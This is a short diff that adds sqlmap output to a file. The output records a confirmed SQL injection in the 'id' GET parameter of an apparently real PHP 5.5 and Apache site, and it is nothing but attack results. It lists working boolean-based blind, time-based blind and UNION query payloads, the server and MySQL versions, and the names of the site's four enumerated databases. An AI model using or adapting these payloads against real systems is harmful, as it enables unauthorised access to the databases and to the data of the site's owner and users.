@@ -21,3 +21,26 @@ available databases [4]:
 [*] db60784_leongVimeo
 [*] information_schema
 
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=25 AND 1186=1186
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=25 AND SLEEP(5)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: id=25 UNION ALL SELECT NULL,NULL,CONCAT(0x7170767171,0x76597a634170686d44484b44434858424f646c626e6b4b596d7a6367514c4559626c65617547514e,0x7176627671),NULL,NULL#
+---
+web application technology: PHP 5.5.35, Apache 2.2.22
+back-end DBMS: MySQL >= 5.0.12
+available databases [4]:
+[*] db60784_leong
+[*] db60784_leongAugust
+[*] db60784_leongVimeo
+[*] information_schema
+
